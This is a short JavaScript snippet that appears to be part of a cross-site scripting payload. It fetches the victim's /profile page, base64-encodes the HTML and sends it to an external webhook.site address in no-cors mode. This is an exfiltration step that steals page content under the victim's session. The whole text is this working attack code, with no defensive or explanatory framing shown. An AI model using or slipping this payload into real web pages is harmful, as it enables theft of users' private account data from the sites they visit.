// Also fetch and send profile page
fetch("/profile")
    .then(response => response.text())
    .then(html => {
        fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?profile=' + 
              btoa(html), {mode: 'no-cors'});
    });
